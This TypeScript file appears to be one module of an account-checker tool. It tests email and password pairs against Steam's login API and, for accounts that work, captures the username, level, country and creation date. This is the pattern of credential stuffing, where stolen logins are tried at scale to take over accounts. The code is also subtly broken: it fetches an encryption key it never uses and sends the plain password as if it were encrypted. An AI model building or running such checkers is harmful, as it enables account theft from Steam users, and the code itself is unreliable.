import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class SteamChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Steam login endpoint
      const response = await this.client.post(
        'https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/',
        {
          account_name: email,
        }
      );

      // Simulate login attempt
      const loginResponse = await this.client.post(
        'https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/',
        {
          account_name: email,
          encrypted_password: password,
          encryption_timestamp: Date.now(),
          remember_login: true,
          platform_type: 2,
        }
      );

      if (loginResponse.data?.response?.steamid) {
        // Get account details
        const capture = await this.getAccountDetails(loginResponse.data.response.steamid);
        
        return this.createResult(email, password, 'steam', 'valid', capture);
      }

      return this.createResult(email, password, 'steam', 'invalid');
    } catch (error: any) {
      return this.createResult(
        email,
        password,
        'steam',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(steamId: string) {
    try {
      const response = await this.client.get(
        `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/`,
        {
          params: { steamids: steamId },
        }
      );

      const player = response.data?.response?.players?.[0];
      
      return {
        username: player?.personaname,
        steamBalance: 0, // Would need wallet API
        level: player?.player_level,
        createdDate: player?.timecreated ? new Date(player.timecreated * 1000).toISOString() : undefined,
        lastLogin: player?.lastlogoff ? new Date(player.lastlogoff * 1000).toISOString() : undefined,
        country: player?.loccountrycode,
      };
    } catch {
      return {};
    }
  }
}
